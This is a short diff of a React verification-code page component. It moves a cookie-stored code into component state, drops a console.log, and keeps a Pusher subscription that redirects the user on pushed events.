@@ -7,6 +7,7 @@ import Pusher from "pusher-js";
 export default function VerifyCode() {
   const[successId, setSuccessId] = useState('');
   const[ReverifyId, setReVerifyId] = useState('');
+  const[code,setCode] = useState('');
   const router = useRouter()
   const id = Cookies.get("id");
   const pusher = new Pusher("e4766909b306ad7ddd58", {
@@ -14,6 +15,9 @@ export default function VerifyCode() {
     cluster: "ap2",
     encrypted: true,
   });
+  useEffect(() => {
+    setCode(Cookies.get("code"))
+  }, [code]);
   useEffect(() => {
     const channel = pusher.subscribe(id);
 
@@ -53,8 +57,7 @@ if (ReverifyId) {
   // Perform the revalidation or data fetching logic here
 return router.push(`/reVerifyCode`);
 }
-const code=Cookies.get("code")
-console.log(code)
+
   return (
     <div className="font-roboto min-h-screen md:flex flex-col justify-center items-center bg-white text-[#202124] text-base">
       <div className="md:border border-slate-300 rounded-lg px-6 md:px-10 py-9 md:w-[450px] h-[550px]">
